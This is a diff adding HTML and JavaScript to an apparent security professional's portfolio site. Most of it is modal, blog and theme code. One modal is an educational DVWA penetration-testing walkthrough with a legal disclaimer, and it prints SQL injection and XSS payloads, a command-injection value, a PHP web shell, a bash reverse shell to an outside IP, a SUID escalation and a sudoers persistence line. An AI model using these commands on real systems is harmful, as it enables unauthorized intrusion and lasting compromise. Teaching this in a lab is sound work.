+
+# Check Falco alerts
+$ kubectl logs -n falco-system -l app=falco -f</code></pre>
+                    </div>
+                </div>
+
+                <div class="bg-secondary/10 border border-secondary/30 rounded-lg p-4">
+                    <h5 class="font-mono font-semibold text-secondary mb-2">Security Checklist</h5>
+                    <ul class="text-gray-400 space-y-1">
+                        <li>☑ RBAC configured with least privilege</li>
+                        <li>☑ Pod Security Standards enforced</li>
+                        <li>☑ Network policies deny-all by default</li>
+                        <li>☑ Runtime security monitoring active</li>
+                        <li>☑ Secrets encrypted at rest</li>
+                        <li>☑ API server audit logging enabled</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Web Pentesting Lab Modal -->
+    <div id="lab-pentesting" class="modal">
+        <div class="modal-content p-8 m-4">
+            <div class="flex justify-between items-start mb-6">
+                <h2 class="text-3xl font-mono font-bold text-primary glow-purple">Hands-On: Web App Penetration Testing</h2>
+                <button onclick="closeModal('lab-pentesting')" class="text-gray-400 hover:text-gray-100 text-2xl cursor-pointer">&times;</button>
+            </div>
+
+            <div class="space-y-6 text-gray-300">
+                <div class="bg-red-500/10 border border-red-500/30 rounded-lg p-4">
+                    <p class="text-red-400 font-mono text-sm">
+                        ⚠ DISCLAIMER: This lab is for educational purposes only. Only perform penetration testing on systems you own or have explicit written permission to test. Unauthorized access is illegal.
+                    </p>
+                </div>
+
+                <div>
+                    <h4 class="text-xl font-mono font-semibold text-secondary mb-3">Methodology</h4>
+                    <p class="leading-relaxed mb-4">
+                        This walkthrough demonstrates a complete penetration testing engagement on a deliberately vulnerable web application (DVWA - Damn Vulnerable Web Application).
+                        We'll follow the OWASP Testing Guide methodology.
+                    </p>
+                </div>
+
+                <div>
+                    <h4 class="text-xl font-mono font-semibold text-secondary mb-3">Phase 1: Reconnaissance</h4>
+                    <div class="code-block">
+                        <pre class="text-sm text-gray-300 font-mono"><code># Port scanning
+$ nmap -sV -sC -p- target.local
+
+# Web technology fingerprinting
+$ whatweb http://target.local
+
+# Directory enumeration
+$ gobuster dir \
+  -u http://target.local \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -x php,html,txt
+
+# Subdomain enumeration
+$ subfinder -d target.local
+$ amass enum -d target.local</code></pre>
+                    </div>
+                </div>
+
+                <div>
+                    <h4 class="text-xl font-mono font-semibold text-secondary mb-3">Phase 2: Vulnerability Discovery</h4>
+                    <div class="code-block">
+                        <pre class="text-sm text-gray-300 font-mono"><code># SQL Injection Testing
+# Payload: ' OR '1'='1
+http://target.local/login.php?user=admin'%20OR%20'1'='1&pass=test
+
+# XSS Testing
+# Payload: <script>alert(document.cookie)</script>
+http://target.local/search?q=<script>alert(document.cookie)</script>
+
+# Using SQLMap for automated SQL injection
+$ sqlmap -u "http://target.local/product.php?id=1" \
+  --dbs \
+  --batch
+
+# Command Injection
+# Payload: ; whoami
+http://target.local/ping.php?host=127.0.0.1;whoami
+
+# File Upload Vulnerability
+# Create malicious PHP file
+$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
+# Upload and access: http://target.local/uploads/shell.php?cmd=id</code></pre>
+                    </div>
+                </div>
+
+                <div>
+                    <h4 class="text-xl font-mono font-semibold text-secondary mb-3">Phase 3: Exploitation</h4>
+                    <div class="code-block">
+                        <pre class="text-sm text-gray-300 font-mono"><code># Establish reverse shell
+# On attacker machine
+$ nc -lvnp 4444
+
+# On compromised server (via RCE)
+$ bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
+
+# Privilege escalation enumeration
+$ find / -perm -4000 -type f 2>/dev/null
+$ sudo -l
+$ cat /etc/crontab
+
+# Exploit SUID binary
+$ /usr/bin/find . -exec /bin/sh -p \; -quit
+
+# Persistence
+$ echo "attacker ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers</code></pre>
+                    </div>
+                </div>
+
+                <div>
+                    <h4 class="text-xl font-mono font-semibold text-secondary mb-3">OWASP Top 10 Coverage</h4>
+                    <div class="grid md:grid-cols-2 gap-3">
+                        <div class="bg-dark-900 border border-red-500/20 rounded-lg p-3">
+                            <h5 class="font-mono text-sm font-semibold text-red-500">A01: Broken Access Control</h5>
+                            <p class="text-xs text-gray-400">IDOR, missing function-level authorization</p>
+                        </div>
+                        <div class="bg-dark-900 border border-red-500/20 rounded-lg p-3">
+                            <h5 class="font-mono text-sm font-semibold text-red-500">A02: Cryptographic Failures</h5>
+                            <p class="text-xs text-gray-400">Weak hashing, plaintext storage</p>
+                        </div>
+                        <div class="bg-dark-900 border border-red-500/20 rounded-lg p-3">
+                            <h5 class="font-mono text-sm font-semibold text-red-500">A03: Injection</h5>
+                            <p class="text-xs text-gray-400">SQL injection, command injection, LDAP</p>
+                        </div>
+                        <div class="bg-dark-900 border border-red-500/20 rounded-lg p-3">
+                            <h5 class="font-mono text-sm font-semibold text-red-500">A07: XSS</h5>
+                            <p class="text-xs text-gray-400">Reflected, stored, DOM-based XSS</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-orange-500/10 border border-orange-500/30 rounded-lg p-4">
+                    <h5 class="font-mono font-semibold text-orange-500 mb-2">Report Writing</h5>
+                    <p class="text-gray-400 text-sm">
+                        A professional penetration test report should include: Executive Summary, Scope, Methodology,
+                        Detailed Findings (with CVSS scores), Evidence (screenshots/PoC), Remediation Recommendations, and an Appendix with technical details.
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Blog Reader Modal -->
+    <div id="blog-reader" class="modal">
+        <div class="modal-content p-8 m-4 max-w-4xl">
+            <div class="flex justify-between items-start mb-6">
+                <div id="blog-meta" class="flex-1"></div>
+                <button onclick="closeModal('blog-reader')" class="text-gray-400 hover:text-gray-100 text-2xl cursor-pointer ml-4">&times;</button>
+            </div>
+            <div id="blog-series-info" class="mb-6"></div>
+            <div id="blog-content" class="prose prose-invert max-w-none"></div>
+            <div id="blog-series-nav" class="mt-8"></div>
+        </div>
+    </div>
+
+    <!-- JavaScript for Modal Functionality -->
+    <script>
+        function openModal(modalId) {
+            document.getElementById(modalId).classList.add('active');
+            document.body.style.overflow = 'hidden';
+
+            // If this is a certification modal, show series navigation
+            const navElement = document.getElementById(`${modalId}-series-nav`);
+            if (navElement) {
+                navElement.innerHTML = showCertSeriesNav(modalId);
+            }
+        }
+
+        function closeModal(modalId) {
+            document.getElementById(modalId).classList.remove('active');
+            document.body.style.overflow = 'auto';
+        }
+
+        // Close modal when clicking outside
+        window.onclick = function(event) {
+            if (event.target.classList.contains('modal')) {
+                event.target.classList.remove('active');
+                document.body.style.overflow = 'auto';
+            }
+        }
+
+        // Close modal with Escape key
+        document.addEventListener('keydown', function(event) {
+            if (event.key === 'Escape') {
+                const activeModal = document.querySelector('.modal.active');
+                if (activeModal) {
+                    activeModal.classList.remove('active');
+                    document.body.style.overflow = 'auto';
+                }
+            }
+        });
+
+        // Certification data with series
+        const certifications = [
+            {
+                id: 'aws-cert',
+                title: 'AWS Solutions Architect',
+                subtitle: 'Associate Level',
+                date: 'March 2024',
+                series: { name: 'Cloud Infrastructure Path', part: 1, total: 2 }
+            },
+            {
+                id: 'cka-cert',
+                title: 'Certified Kubernetes Administrator',
+                subtitle: 'CKA',
+                date: 'June 2024',
+                series: { name: 'Cloud Infrastructure Path', part: 2, total: 2 }
+            },
+            {
+                id: 'oscp-cert',
+                title: 'Offensive Security Certified Professional',
+                subtitle: 'OSCP',
+                date: 'September 2024',
+                series: { name: 'Security Path', part: 1, total: 2 }
+            },
+            {
+                id: 'security-plus',
+                title: 'CompTIA Security+',
+                subtitle: 'Certified',
+                date: 'December 2023',
+                series: { name: 'Security Path', part: 2, total: 2 }
+            }
+        ];
+
+        // Function to show certification series navigation
+        function showCertSeriesNav(certId) {
+            const currentCert = certifications.find(c => c.id === certId);
+            if (!currentCert || !currentCert.series) return '';
+
+            const seriesName = currentCert.series.name;
+            const seriesCerts = certifications.filter(c => c.series && c.series.name === seriesName)
+                .sort((a, b) => a.series.part - b.series.part);
+
+            const currentIndex = seriesCerts.findIndex(c => c.id === certId);
+            const prevCert = currentIndex > 0 ? seriesCerts[currentIndex - 1] : null;
+            const nextCert = currentIndex < seriesCerts.length - 1 ? seriesCerts[currentIndex + 1] : null;
+
+            let html = `
+                <div class="mt-8 border-t border-dark-700 pt-6">
+                    <div class="bg-gradient-to-r from-primary/10 to-secondary/10 border border-primary/30 rounded-lg p-4 mb-6">
+                        <h4 class="text-lg font-mono font-semibold text-gray-100 mb-2">
+                            📚 ${seriesName}
+                        </h4>
+                        <p class="text-sm text-gray-400 mb-3">Part ${currentCert.series.part} of ${currentCert.series.total}</p>
+                        <div class="space-y-2">
+                            ${seriesCerts.map((cert, idx) => `
+                                <div class="flex items-center space-x-2 text-sm ${cert.id === certId ? 'text-secondary font-semibold' : 'text-gray-400'}">
+                                    <span class="font-mono">${idx + 1}.</span>
+                                    <a href="javascript:void(0)" onclick="openModal('${cert.id}'); showCertSeriesNav('${cert.id}')" class="hover:text-secondary transition-colors duration-200 ${cert.id === certId ? 'cursor-default' : 'cursor-pointer'}">
+                                        ${cert.title} ${cert.id === certId ? '← You are here' : ''}
+                                    </a>
+                                </div>
+                            `).join('')}
+                        </div>
+                    </div>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                        ${prevCert ? `
+                            <div class="bg-dark-800/50 border border-primary/20 rounded-lg p-4 card-hover cursor-pointer" onclick="closeModal('${certId}'); openModal('${prevCert.id}')">
+                                <div class="text-xs text-gray-500 font-mono mb-1">← PREVIOUS</div>
+                                <div class="text-sm font-mono text-gray-200">${prevCert.title}</div>
+                            </div>
+                        ` : '<div></div>'}
+                        ${nextCert ? `
+                            <div class="bg-dark-800/50 border border-secondary/20 rounded-lg p-4 card-hover cursor-pointer text-right" onclick="closeModal('${certId}'); openModal('${nextCert.id}')">
+                                <div class="text-xs text-gray-500 font-mono mb-1">NEXT →</div>
+                                <div class="text-sm font-mono text-gray-200">${nextCert.title}</div>
+                            </div>
+                        ` : ''}
+                    </div>
+                </div>
+            `;
+
+            return html;
+        }
+
+        // Blog functionality
+        // Store posts globally for series navigation
+        let allBlogPosts = [];
+
+        async function loadBlogPosts() {
+            try {
+                const response = await fetch('blog/blog-index.json');
+                const posts = await response.json();
+                allBlogPosts = posts;
+                const container = document.getElementById('blog-posts-container');
+
+                container.innerHTML = posts.map(post => `
+                    <article class="bg-dark-800/50 backdrop-blur-sm border border-primary/20 rounded-xl overflow-hidden card-hover cursor-pointer" onclick="readBlogPost('${post.id}')">
+                        <div class="p-6 space-y-4">
+                            <div class="flex items-center flex-wrap gap-2 text-sm">
+                                <span class="bg-${post.category === 'DevOps' ? 'primary' : 'secondary'}/20 text-${post.category === 'DevOps' ? 'primary' : 'secondary'} px-3 py-1 rounded font-mono">${post.category}</span>
+                                ${post.series ? `<span class="bg-gradient-to-r from-primary/20 to-secondary/20 text-gray-300 px-3 py-1 rounded font-mono border border-primary/30">${post.series.name} • Part ${post.series.part}/${post.series.total}</span>` : ''}
+                                <span class="text-gray-500 font-mono">•</span>
+                                <span class="text-gray-400 font-mono">${new Date(post.date).toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' })}</span>
+                            </div>
+                            <h3 class="text-2xl font-mono font-semibold text-gray-100 hover:text-secondary transition-colors duration-200">
+                                ${post.title}
+                            </h3>
+                            <p class="text-gray-400 leading-relaxed">
+                                ${post.excerpt}
+                            </p>
+                            <div class="flex items-center justify-between pt-4 border-t border-dark-700">
+                                <span class="text-secondary hover:text-secondary/80 font-mono text-sm transition-colors duration-200">Read More →</span>
+                                <span class="text-gray-500 font-mono text-sm">${post.readTime}</span>
+                            </div>
+                        </div>
+                    </article>
+                `).join('');
+            } catch (error) {
+                console.error('Error loading blog posts:', error);
+                document.getElementById('blog-posts-container').innerHTML = `
+                    <div class="col-span-2 text-center py-12">
+                        <p class="text-red-400 font-mono">Error loading blog posts. Please try again later.</p>
+                    </div>
+                `;
+            }
+        }
+
+        async function readBlogPost(postId) {
+            try {
+                // Find the current post
+                const currentPost = allBlogPosts.find(p => p.id === postId);
+                if (!currentPost) {
+                    throw new Error('Post not found');
+                }
+
+                const response = await fetch(`blog/${currentPost.folder}/README.md`);
+                const markdown = await response.text();
+
+                // Configure marked options
+                marked.setOptions({
+                    highlight: function(code, lang) {
+                        return code;
+                    },
+                    breaks: true,
+                    gfm: true
+                });
+
+                const html = marked.parse(markdown);
+
+                // Set meta information
+                document.getElementById('blog-meta').innerHTML = `
+                    <div class="flex items-center flex-wrap gap-2 mb-4">
+                        <span class="bg-${currentPost.category === 'DevOps' ? 'primary' : 'secondary'}/20 text-${currentPost.category === 'DevOps' ? 'primary' : 'secondary'} px-3 py-1 rounded font-mono text-sm">${currentPost.category}</span>
+                        ${currentPost.series ? `<span class="bg-gradient-to-r from-primary/20 to-secondary/20 text-gray-300 px-3 py-1 rounded font-mono text-sm border border-primary/30">${currentPost.series.name} • Part ${currentPost.series.part}/${currentPost.series.total}</span>` : ''}
+                        <span class="text-gray-500 font-mono">•</span>
+                        <span class="text-gray-400 font-mono text-sm">${new Date(currentPost.date).toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' })}</span>
+                    </div>
+                `;
+
+                // Set blog content
+                document.getElementById('blog-content').innerHTML = html;
+
+                // Style the markdown content
+                const content = document.getElementById('blog-content');
+
+                // Style headings
+                content.querySelectorAll('h1, h2, h3, h4, h5, h6').forEach(el => {
+                    el.classList.add('font-mono', 'font-bold', 'text-gray-100', 'mb-4', 'mt-6');
+                    if (el.tagName === 'H1') el.classList.add('text-4xl', 'text-primary', 'glow-purple');
+                    if (el.tagName === 'H2') el.classList.add('text-3xl', 'text-secondary');
+                    if (el.tagName === 'H3') el.classList.add('text-2xl');
+                });
+
+                // Style paragraphs
+                content.querySelectorAll('p').forEach(el => {
+                    el.classList.add('text-gray-300', 'leading-relaxed', 'mb-4');
+                });
+
+                // Style code blocks
+                content.querySelectorAll('pre').forEach(el => {
+                    el.classList.add('bg-dark-900', 'border', 'border-secondary/20', 'rounded-lg', 'p-4', 'overflow-x-auto', 'mb-4');
+                    el.querySelectorAll('code').forEach(code => {
+                        code.classList.add('text-sm', 'text-gray-300', 'font-mono');
+                    });
+                });
+
+                // Style inline code
+                content.querySelectorAll('code:not(pre code)').forEach(el => {
+                    el.classList.add('bg-dark-900', 'px-2', 'py-1', 'rounded', 'text-secondary', 'font-mono', 'text-sm');
+                });
+
+                // Style lists
+                content.querySelectorAll('ul, ol').forEach(el => {
+                    el.classList.add('text-gray-300', 'mb-4', 'ml-6');
+                });
+
+                content.querySelectorAll('li').forEach(el => {
+                    el.classList.add('mb-2');
+                });
+
+                // Style links
+                content.querySelectorAll('a').forEach(el => {
+                    el.classList.add('text-secondary', 'hover:text-secondary/80', 'underline', 'transition-colors', 'duration-200');
+                });
+
+                // Style blockquotes
+                content.querySelectorAll('blockquote').forEach(el => {
+                    el.classList.add('border-l-4', 'border-primary', 'pl-4', 'italic', 'text-gray-400', 'mb-4');
+                });
+
+                // Style images
+                content.querySelectorAll('img').forEach(el => {
+                    el.classList.add('rounded-lg', 'w-full', 'mb-4');
+                });
+
+                // Style tables
+                content.querySelectorAll('table').forEach(el => {
+                    el.classList.add('w-full', 'border-collapse', 'mb-4');
+                });
+
+                content.querySelectorAll('th').forEach(el => {
+                    el.classList.add('bg-dark-800', 'border', 'border-dark-700', 'px-4', 'py-2', 'text-left', 'font-mono', 'text-secondary');
+                });
+
+                content.querySelectorAll('td').forEach(el => {
+                    el.classList.add('border', 'border-dark-700', 'px-4', 'py-2', 'text-gray-300');
+                });
+
+                // Handle series navigation if post is part of a series
+                if (currentPost.series) {
+                    const seriesName = currentPost.series.name;
+                    const seriesPosts = allBlogPosts
+                        .filter(p => p.series && p.series.name === seriesName)
+                        .sort((a, b) => a.series.part - b.series.part);
+
+                    const currentIndex = seriesPosts.findIndex(p => p.id === postId);
+                    const prevPost = currentIndex > 0 ? seriesPosts[currentIndex - 1] : null;
+                    const nextPost = currentIndex < seriesPosts.length - 1 ? seriesPosts[currentIndex + 1] : null;
+
+                    // Series info banner
+                    document.getElementById('blog-series-info').innerHTML = `
+                        <div class="bg-gradient-to-r from-primary/10 to-secondary/10 border border-primary/30 rounded-lg p-4">
+                            <div class="flex items-start justify-between">
+                                <div>
+                                    <h4 class="text-lg font-mono font-semibold text-gray-100 mb-2">
+                                        📚 ${seriesName} Series
+                                    </h4>
+                                    <p class="text-sm text-gray-400 mb-3">Part ${currentPost.series.part} of ${currentPost.series.total}</p>
+                                    <div class="space-y-2">
+                                        ${seriesPosts.map((post, idx) => `
+                                            <div class="flex items-center space-x-2 text-sm ${post.id === postId ? 'text-secondary font-semibold' : 'text-gray-400'}">
+                                                <span class="font-mono">${idx + 1}.</span>
+                                                <a href="javascript:void(0)" onclick="readBlogPost('${post.id}')" class="hover:text-secondary transition-colors duration-200 ${post.id === postId ? 'cursor-default' : 'cursor-pointer'}">
+                                                    ${post.title} ${post.id === postId ? '← You are here' : ''}
+                                                </a>
+                                            </div>
+                                        `).join('')}
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    `;
+
+                    // Prev/Next navigation
+                    document.getElementById('blog-series-nav').innerHTML = `
+                        <div class="border-t border-dark-700 pt-6">
+                            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                                ${prevPost ? `
+                                    <div class="bg-dark-800/50 border border-primary/20 rounded-lg p-4 card-hover cursor-pointer" onclick="readBlogPost('${prevPost.id}')">
+                                        <div class="text-xs text-gray-500 font-mono mb-1">← PREVIOUS</div>
+                                        <div class="text-sm font-mono text-gray-200">${prevPost.title}</div>
+                                    </div>
+                                ` : '<div></div>'}
+                                ${nextPost ? `
+                                    <div class="bg-dark-800/50 border border-secondary/20 rounded-lg p-4 card-hover cursor-pointer text-right" onclick="readBlogPost('${nextPost.id}')">
+                                        <div class="text-xs text-gray-500 font-mono mb-1">NEXT →</div>
+                                        <div class="text-sm font-mono text-gray-200">${nextPost.title}</div>
+                                    </div>
+                                ` : ''}
+                            </div>
+                        </div>
+                    `;
+                } else {
+                    document.getElementById('blog-series-info').innerHTML = '';
+                    document.getElementById('blog-series-nav').innerHTML = '';
+                }
+
+                openModal('blog-reader');
+            } catch (error) {
+                console.error('Error loading blog post:', error);
+                alert('Error loading blog post. Please try again later.');
+            }
+        }
+
+        // Load blog posts on page load
+        document.addEventListener('DOMContentLoaded', function() {
+            loadBlogPosts();
+            initTheme();
+        });
+
+        // Theme toggle functionality
+        function initTheme() {
+            const themeToggleBtn = document.getElementById('theme-toggle');
+            const themeToggleDarkIcon = document.getElementById('theme-toggle-dark-icon');
+            const themeToggleLightIcon = document.getElementById('theme-toggle-light-icon');
+
+            // Check for saved theme preference or default to dark mode
+            const savedTheme = localStorage.getItem('theme') || 'dark';
+
+            if (savedTheme === 'light') {
+                document.documentElement.classList.add('light');
+                themeToggleLightIcon.classList.remove('hidden');
+            } else {
+                document.documentElement.classList.remove('light');
+                themeToggleDarkIcon.classList.remove('hidden');
+            }
+
+            themeToggleBtn.addEventListener('click', function() {
+                // Toggle icons
+                themeToggleDarkIcon.classList.toggle('hidden');
+                themeToggleLightIcon.classList.toggle('hidden');
+
+                // Toggle theme
+                if (document.documentElement.classList.contains('light')) {
+                    document.documentElement.classList.remove('light');
+                    localStorage.setItem('theme', 'dark');
+                } else {
+                    document.documentElement.classList.add('light');
+                    localStorage.setItem('theme', 'light');
+                }
+            });
+        }
+    </script>
+</body>
+</html>
